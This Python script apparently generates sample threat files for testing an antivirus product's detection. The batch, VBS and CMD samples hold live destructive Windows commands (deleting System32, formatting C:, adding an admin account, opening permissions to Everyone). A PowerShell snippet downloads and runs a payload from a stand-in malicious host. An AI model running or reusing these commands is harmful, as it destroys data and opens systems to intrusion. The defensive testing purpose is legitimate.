#!/usr/bin/env python3
"""
IronWall Antivirus - Test Threat Generator
Creates sample threat files for testing antivirus detection
"""

import os
import hashlib
from datetime import datetime

def create_test_threats():
    """Create various test threat files"""
    
    # Create test directory
    test_dir = "test_threats"
    os.makedirs(test_dir, exist_ok=True)
    
    print("🛡️ Creating test threat files for IronWall Antivirus...")
    
    # 1. Malicious BAT file
    malicious_bat = os.path.join(test_dir, "malicious_script.bat")
    with open(malicious_bat, 'w') as f:
        f.write("""@echo off
echo This is a test malicious batch file
del *.* /q
shutdown /s /t 0
reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Test /v Malicious /t REG_SZ /d "Test" /f
taskkill /f /im explorer.exe
""")
    
    # 2. PowerShell bypass script
    powershell_script = os.path.join(test_dir, "suspicious_powershell.ps1")
    with open(powershell_script, 'w') as f:
        f.write("""# Suspicious PowerShell script
$encoded = "base64_encoded_content_here"
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Download and execute
$url = "http://malicious-site.com/payload.exe"
$output = "$env:TEMP\\payload.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
""")
    
    # 3. VBS script with dangerous commands
    vbs_script = os.path.join(test_dir, "dangerous_vbs.vbs")
    with open(vbs_script, 'w') as f:
        f.write("""' Dangerous VBS script
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c del /s /q C:\\Windows\\System32", 0, False
objShell.Run "cmd.exe /c format C: /q", 0, False
objShell.Run "cmd.exe /c shutdown /s /t 0", 0, False
""")
    
    # 4. JavaScript with suspicious URLs
    js_script = os.path.join(test_dir, "suspicious_js.js")
    with open(js_script, 'w') as f:
        f.write("""// Suspicious JavaScript with multiple URLs
var urls = [
    "https://malicious-site1.com/payload1.exe",
    "https://malicious-site2.com/payload2.exe", 
    "https://malicious-site3.com/payload3.exe",
    "https://malicious-site4.com/payload4.exe",
    "https://malicious-site5.com/payload5.exe",
    "https://malicious-site6.com/payload6.exe"
];

for (var i = 0; i < urls.length; i++) {
    downloadFile(urls[i]);
}

function downloadFile(url) {
    // Download and execute logic
    console.log("Downloading from: " + url);
}
""")
    
    # 5. Text file with dangerous patterns
    dangerous_txt = os.path.join(test_dir, "dangerous_patterns.txt")
    with open(dangerous_txt, 'w') as f:
        f.write("""This file contains dangerous patterns:

1. Command execution: cmd.exe /c del *.*
2. System shutdown: shutdown /s /t 0
3. Registry modification: reg add HKEY_LOCAL_MACHINE
4. Process termination: taskkill /f /im explorer.exe
5. File download: wget http://malicious-site.com/file.exe
6. Network commands: net user administrator /add
7. Scheduled tasks: schtasks /create /tn "Malicious" /tr "cmd.exe"
8. File permissions: icacls C:\\ /grant Everyone:F
9. Network scanning: netstat -an
10. Service manipulation: net start "MaliciousService"

This should trigger pattern detection.
""")
    
    # 6. Large executable simulation (text file with .exe extension)
    fake_exe = os.path.join(test_dir, "large_fake.exe")
    with open(fake_exe, 'w') as f:
        # Create a large file to trigger size detection
        f.write("MZ" + "A" * (1024 * 1024))  # 1MB file
    
    # 7. Executable with wrong extension
    exe_wrong_ext = os.path.join(test_dir, "malware.txt")
    with open(exe_wrong_ext, 'wb') as f:
        f.write(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21")
    
    # 8. Base64 encoded content
    encoded_file = os.path.join(test_dir, "encoded_content.txt")
    with open(encoded_file, 'w') as f:
        f.write("""This file contains base64 encoded content:

UEsDBBQAAAAIAAxKb2QAAAAAAAAAAAAAAAAJAAAAc2FtcGxlLmJhdEBlY2hvIG9mZgplY2hvIFRoaXMg
aXMgYSB0ZXN0IG1hbGljaW91cyBiYXRjaCBmaWxlCmRlbCAqLiogL3EKc2h1dGRvd24gL3MgL3QgMApS
ZWcgYWRkIEhLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxUZXN0IC92IE1hbGljaW91cyAvdCBSRUdf
U1ogL2QgIlRlc3QiIC9mCnRhc2traWxsIC9mIC9pbSBleHBsb3Jlci5leGUKUEsBAhQAFAAAAAgADEpv
ZAAAAAAAAAAAAAAAAAkAJAAAAAAAAAAQAO1BAAAAAHNhbXBsZS5iYXRQSwUGAAAAAAEAAQA5AAAAOwAA
AAA=

This should trigger encoded content detection.
""")
    
    # 9. Multiple command file
    multi_cmd = os.path.join(test_dir, "multiple_commands.cmd")
    with open(multi_cmd, 'w') as f:
        f.write("""@echo off
REM Multiple dangerous commands
echo Starting malicious operations...

REM Delete files
del /s /q C:\\Users\\*.*
del /s /q C:\\Documents\\*.*

REM System commands
shutdown /s /t 0
format C: /q /y

REM Registry operations
reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Malicious /v Enabled /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\\Software\\Malicious /v Active /t REG_SZ /d "Yes" /f

REM Process operations
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe

REM Network operations
net user hacker /add
net localgroup administrators hacker /add

REM File operations
icacls C:\\ /grant Everyone:F /t
cacls C:\\ /e /p Everyone:F

echo Malicious operations completed.
pause
""")
    
    # 10. Suspicious URLs file
    urls_file = os.path.join(test_dir, "suspicious_urls.txt")
    with open(urls_file, 'w') as f:
        f.write("""This file contains many suspicious URLs:

Download links:
https://malicious-site1.com/payload1.exe
https://malicious-site2.com/payload2.exe
https://malicious-site3.com/payload3.exe
https://malicious-site4.com/payload4.exe
https://malicious-site5.com/payload5.exe
https://malicious-site6.com/payload6.exe
https://malicious-site7.com/payload7.exe
https://malicious-site8.com/payload8.exe

Command and control servers:
https://c2-server1.com/checkin
https://c2-server2.com/checkin
https://c2-server3.com/checkin

Data exfiltration:
https://exfil-server.com/upload
https://data-theft.com/steal

This should trigger multiple URL detection.
""")
    
    # Calculate hashes for verification
    print("\n📋 Generated test files:")
    test_files = [
        malicious_bat, powershell_script, vbs_script, js_script,
        dangerous_txt, fake_exe, exe_wrong_ext, encoded_file,
        multi_cmd, urls_file
    ]
    
    for file_path in test_files:
        if os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            print(f"  ✅ {os.path.basename(file_path)} ({file_size} bytes)")
    
    print(f"\n🎯 Test threats created in '{test_dir}' directory")
    print("🔍 Run IronWall Antivirus to test detection capabilities!")
    print("\n💡 Test scenarios:")
    print("  • Full Deep Scan: Should detect pattern matches")
    print("  • Folder Scan: Scan the 'test_threats' directory")
    print("  • Hash Detection: Some files may match example hashes")
    print("  • Pattern Matching: BAT files with dangerous commands")
    print("  • Extension Monitoring: Executable with wrong extension")
    print("  • Content Analysis: Base64 encoded content")
    print("  • URL Detection: Files with multiple suspicious URLs")

if __name__ == "__main__":
    create_test_threats() 